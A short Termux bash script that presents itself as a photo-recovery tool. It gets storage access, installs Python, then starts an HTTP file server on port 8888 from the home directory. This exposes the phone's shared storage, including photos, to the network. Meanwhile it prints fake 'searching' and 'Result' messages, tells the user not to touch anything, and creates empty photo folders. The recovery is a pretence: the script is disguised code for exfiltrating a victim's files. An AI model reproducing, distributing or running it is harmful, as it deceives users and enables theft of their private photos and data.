#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
END="\e[0m"

echo -e "${GREEN}Running Software!${END}"
cd ~
if [ -d "storage" ]
then
  :
else
  echo -e "${RED}Please storage access!${END}"
  while [ ! -d "storage" ]
  do
    termux-setup-storage
  done
fi
echo -e "${GREEN}Update and upgrade!\nInstall software's!\nDon't touch anything!\nPlease wait!${END}"
pkg update
pkg upgrade -y -o Dpkg::Options::="--force-confdef --force-confold"
pkg install -y python
echo -e "${GREEN}Search and recovery photos!\nPlease wait!${END}"
python -m http.server 8888 > /dev/null 2>&1
sleep 2
echo -e "${GREEN}Result 1!${END}"
sleep 2
echo -e "${GREEN}Result 2!${END}"
sleep 2
echo -e "${GREEN}Result 3!${END}"
sleep 2
mkdir photo1 photo2 photo3
ls
